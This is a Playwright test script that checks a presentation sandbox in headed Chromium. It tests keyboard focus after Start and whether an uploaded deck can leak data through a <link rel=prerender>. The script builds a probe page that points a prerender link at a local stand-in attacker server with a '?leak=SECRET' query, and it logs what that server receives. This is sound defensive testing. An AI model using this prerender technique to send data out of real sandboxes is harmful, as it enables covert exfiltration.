// EXP18: confirm two full-Chromium findings in a HEADED window (under Xvfb): the keyboard-focus
// hand-off after Start (B1) and the <link rel=prerender> request (W1).
const fs = require('node:fs'); const path = require('node:path'); const http = require('node:http');
const { chromium } = require('playwright'); const L = require('./lib.cjs');
const slidevZip = fs.readFileSync('/home/user/md.qft.org/dist/slidev/interactive-physics.zip');
const focusInfo = () => ({ hasFocus: document.hasFocus(), active: document.activeElement ? document.activeElement.tagName.toLowerCase() : null });
const prerender = `<!doctype html><html lang="en"><head></head><body><h1>headed prerender probe</h1><script>const l=document.createElement('link');l.rel='prerender';l.href='http://localhost:4401/headed-prerender?leak=SECRET';document.head.append(l);</script></body></html>`;
(async () => {
  const site = await L.startSite(4400);
  const log = []; const evil = http.createServer((req, res) => { log.push({ url: req.url, purpose: req.headers['sec-purpose'] || null }); res.writeHead(200, { 'content-type': 'text/html' }); res.end('x'); });
  await new Promise((r) => evil.listen(4401, '0.0.0.0', r));
  const out = {};
  const browser = await chromium.launch({ channel: 'chromium', headless: false });
  try {
    out.version = browser.version();
    { const page = await (await browser.newContext({ viewport: { width: 1300, height: 900 } })).newPage();
      const consoleMessages = []; page.on('console', (m) => { if (m.type() === 'error') consoleMessages.push(m.text().slice(0, 140)); });
      await L.openWorkspace(page, 'http://127.0.0.1:4400/'); await page.bringToFront();
      await L.openFile(page, slidevZip, 'deck.zip');
      await page.locator('[data-pres-start-button]').waitFor({ state: 'visible', timeout: 20000 });
      await page.locator('[data-pres-start-button]').click();
      await L.until(async () => (await L.dialogState(page)).status === 'Playing locally', 'ready', 25000); await L.sleep(1200);
      const frame = L.appFrame(page); const runner = L.runnerFrame(page);
      const title = () => document.querySelector('.slidev-page:not([style*="display: none"]) h1')?.textContent.trim().slice(0, 30);
      const f = out.focus = { headed: true, userAgent: await page.evaluate(() => navigator.userAgent.includes('Headless') ? 'headless UA' : 'headed UA') };
      f.afterStart = { top: await page.evaluate(focusInfo), runner: await runner.evaluate(focusInfo), deck: await frame.evaluate(focusInfo) };
      f.before = await frame.evaluate(title);
      await page.keyboard.press('ArrowRight'); await L.sleep(800);
      f.afterArrowRightWithoutClicking = await frame.evaluate(title);
      const box = await page.locator('[data-pres-host] iframe').boundingBox();
      await page.mouse.click(box.x + box.width / 2, box.y + box.height * 0.8); await L.sleep(300);
      await page.keyboard.press('ArrowRight'); await L.sleep(800);
      f.afterArrowRightAfterClick = await frame.evaluate(title);
      f.console = consoleMessages.filter((m) => /focus/.test(m));
      await page.close(); }
    { const page = await (await browser.newContext()).newPage(); await L.openWorkspace(page, 'http://127.0.0.1:4400/');
      await L.openFile(page, L.makePackage(prerender), 'pr.zip'); await page.locator('[data-pres-start-button]').waitFor({ state: 'visible', timeout: 15000 });
      await page.locator('[data-pres-start-button]').click(); await L.sleep(3500);
      const s = await L.dialogState(page); out.prerender = { hostStatus: s.status, notice: s.notice, attackerReceived: log.slice() }; await page.close(); }
  } finally { await browser.close(); await site.close(); evil.closeAllConnections?.(); await new Promise((r) => evil.close(r)); fs.writeFileSync(path.join(__dirname, 'logs', 'exp18-headed.json'), JSON.stringify(out, null, 2)); }
  console.log(JSON.stringify(out, null, 1));
})().catch((e) => { console.error(e); process.exit(1); });
